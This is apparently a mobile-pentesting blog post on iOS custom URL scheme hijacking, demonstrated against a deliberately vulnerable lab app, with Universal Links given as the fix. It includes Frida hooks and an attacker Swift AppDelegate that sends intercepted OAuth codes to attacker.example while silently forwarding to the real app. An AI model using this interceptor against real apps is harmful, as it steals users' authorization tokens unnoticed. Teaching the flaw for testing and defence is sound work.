@@ -1,0 +1,202 @@
+---
+title: iOS - Custom URL Scheme Hijacking
+author: nirajkharel
+date: 2026-06-27 14:30:00 +0800
+categories: [Mobile Pentesting, iOS]
+tags: [Mobile Pentesting, iOS, URL Scheme, Deep Link]
+render_with_liquid: false
+---
+
+
+iOS lets apps declare custom URL schemes in their Info.plist. Tap `bankapp://`, the system opens the registered app. The system does not deduplicate, multiple apps can claim the same scheme. The order of resolution is undefined: iOS picks one, generally the most-recently-installed, with some caveats. The attacker's app claims the same scheme as the target, gets picked, and any link the user taps that points at that scheme hands the URL data to the attacker.
+
+<aside class="lab">
+  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabAppiOS">VulnLabAppiOS</a></p>
+  <ul>
+    <li><code>ios/VulnLabAppiOS/Info.plist</code></li>
+    <li><code>ios/VulnLabAppiOS/AppDelegate.swift</code></li>
+  </ul>
+</aside>
+
+<br>**The shape, VulnLabAppiOS's Info.plist**
+
+```xml
+<key>CFBundleURLTypes</key>
+<array>
+    <dict>
+        <key>CFBundleURLName</key>
+        <string>com.vulnlab.iosapp</string>
+        <key>CFBundleURLSchemes</key>
+        <array>
+            <string>vulnlab</string>
+        </array>
+    </dict>
+    <dict>
+        <key>CFBundleURLName</key>
+        <string>OAuth Callback</string>
+        <key>CFBundleURLSchemes</key>
+        <array>
+            <string>vulnlaboauth</string>
+        </array>
+    </dict>
+</array>
+```
+
+This registers `vulnlab://` and `vulnlaboauth://` as openable by VulnLabAppiOS. Neither is a unique system identifier.
+
+The attacker registers the same scheme in their Info.plist:
+
+```xml
+<key>CFBundleURLTypes</key>
+<array>
+    <dict>
+        <key>CFBundleURLSchemes</key>
+        <array>
+            <string>vulnlaboauth</string>
+        </array>
+    </dict>
+</array>
+```
+
+After install, both apps claim the scheme. When an OAuth provider redirects to `vulnlaboauth://callback?code=abc123`, iOS picks one app. The attacker's `AppDelegate` receives `application(_:open:options:)` with the URL, including the OAuth authorization code.
+
+<br>**The resolution order**
+
+Older iOS (pre-13ish) used last-installed-wins. Newer iOS uses an undocumented and somewhat random selection, but in practice the most-recently-installed app frequently wins. The attacker installs after the target, they win.
+
+For Universal Links (`https://app.target.com/...` with associated domain configuration), the resolution is deterministic: the app whose `apple-app-site-association` claims the path wins. Custom schemes have no such ownership proof, they are first-come, first-claim, with all the security that implies.
+
+This is why Apple has been moving developers toward Universal Links and away from custom schemes for sensitive operations. Many apps still ship custom schemes for legacy reasons.
+
+<br>**Identifying the target's schemes**
+
+`Info.plist` is the authoritative source - schemes are declared there, not in the binary:
+
+```bash
+cat Payload/VulnLabApp.app/Info.plist | grep -iA 20 CFBundleURLSchemes
+```
+<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/ios-custom-url-1.png">
+
+Confirm the handler is actually wired by hooking `application:openURL:options:` at runtime - this fires whenever the app receives any URL scheme:
+
+```javascript
+setTimeout(function () {
+  const app = ObjC.classes.UIApplication.sharedApplication();
+  const cls = app.delegate().$className;
+  Interceptor.attach(
+    ObjC.classes[cls]['- application:openURL:options:'].implementation,
+    {
+      onEnter: function (args) {
+        console.log('[url-scheme] ' + new ObjC.Object(args[3]));
+      }
+    }
+  );
+}, 2000);
+```
+
+Trigger it from Frida to confirm the handler fires:
+
+```javascript
+ObjC.schedule(ObjC.mainQueue, function () {
+  var url = ObjC.classes.NSURL.URLWithString_('vulnlaboauth://callback?code=testcode123');
+  ObjC.classes.UIApplication.sharedApplication().openURL_(url);
+});
+```
+
+Cross-reference with where the app uses the schemes. The `application(_:open:options:)` handler in `AppDelegate` is the entry point, VulnLabAppiOS's handler is the example:
+
+<img alt="AppDelegate.swift application(_:open:options:) with no caller check (highlight 1) and OAuth code logged (highlight 2)" loading="lazy" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/ios-url-scheme-annotated.png">
+
+<br>**Highlight 1** is `// VULN: no check on options[.sourceApplication]` - note that `sourceApplication` was removed from the options dictionary in iOS 9. Apps can no longer identify who sent them a URL scheme. There is no supported way to verify the caller - which is exactly why custom schemes are insecure by design for sensitive operations.
+
+**Highlight 2** is `print("[oauth] code=\(code ?? \"nil\")")` - the OAuth authorization code is logged via `print`; it appears in Console.app and any process reading the unified log stream.
+
+No `sourceApplication` check, no caller validation. Any app that calls `UIApplication.shared.open(URL(string: "vulnlaboauth://callback?code=...")!)` is treated identically to the legitimate OAuth provider.
+
+<br>**Attacker app, the OAuth-code interceptor**
+
+```swift
+// Attacker's AppDelegate
+func application(_ app: UIApplication,
+                 open url: URL,
+                 options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
+    let urlString = url.absoluteString
+
+    // Exfiltrate the full URL including query string
+    URLSession.shared.dataTask(with: URL(string:
+        "https://attacker.example/?stolen=\(urlString.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed)!)"
+    )!).resume()
+
+    // Optionally forward back to VulnLabAppiOS via a Universal Link so the
+    // legitimate app still opens and the user notices nothing.
+    return true
+}
+```
+
+The attacker's `AppDelegate` receives the URL, exfiltrates the contents, and optionally forwards to the legitimate app via a Universal Link or HTTPS URL. The user sees the legitimate app open after a brief flicker and assumes nothing went wrong.
+
+<br>**Target-side mitigations and their bypasses**
+
+The defence is "validate the URL before acting on it". Apps that do:
+
+```swift
+func application(_ app: UIApplication, open url: URL, ...) -> Bool {
+    guard url.scheme == "vulnlab" else { return false }
+    guard url.host == "auth" else { return false }
+    // ... process auth callback
+}
+```
+
+The validation is correct but useless against scheme hijack, the attacker's app receives the URL too. The validation runs in the wrong app.
+
+The real defence is moving sensitive operations to Universal Links. Apple's recommendation is:
+
+- Use Universal Links (https://) for anything sensitive, password resets, magic links, OAuth callbacks, payment confirmations.
+- Use custom schemes only for non-sensitive operations (open a feature in the app).
+
+Apps that ship sensitive content via custom schemes are vulnerable regardless of any in-app validation.
+
+<br>**The same-scheme across multiple apps, Apple's official documentation**
+
+Apple's documentation explicitly says custom schemes are not unique and apps should not rely on them for security. From the developer docs:
+
+> If multiple apps register the same custom URL scheme, the system delivers the URL to one of them, but the chosen app may vary.
+
+This is the cited authority for the bug. The triage decision tends to be "yes this is a known issue with iOS custom schemes". Some bounty programs accept it as a finding (the developer chose to ship sensitive content over an insecure transport). Some programs reject it as "iOS framework behaviour, not our bug".
+
+Framing the report as "this specific magic-link content is exposed to scheme hijacking, the recommended fix is Universal Links" is more likely to land.
+
+<br>**The Universal Link migration angle**
+
+If the target uses both custom schemes and Universal Links for the same operations, the report should ask why the custom scheme exists at all. The Universal Link is the strict-mode handler, `apple-app-site-association` provides domain ownership proof, no other app can claim the same Universal Link path.
+
+```xml
+<!-- Info.plist - Universal Links via associated domains -->
+<key>com.apple.developer.associated-domains</key>
+<array>
+    <string>applinks:app.vulnlabapp.example.com</string>
+</array>
+```
+
+Combined with the server hosting `https://app.vulnlabapp.example.com/.well-known/apple-app-site-association`:
+
+```json
+{
+    "applinks": {
+        "details": [
+            {
+                "appIDs": ["TEAMID.com.vulnlab.iosapp"],
+                "components": [{ "/": "/auth/*" }]
+            }
+        ]
+    }
+}
+```
+
+The framework verifies the apple-app-site-association against the app's TeamID + bundle ID. Other apps cannot claim the same domain because they cannot serve the same apple-app-site-association.
+
+<br>**Closing**
+
+Custom URL scheme hijacking is the iOS analogue of Android's app-link autoVerify=false bug. The root cause is "Apple's framework does not enforce ownership on custom schemes, the developer shipped sensitive content over them". The mitigation is Universal Links. The bounty submission frames the specific content at risk, not the abstract bug class.
+
+Happy Hacking !!
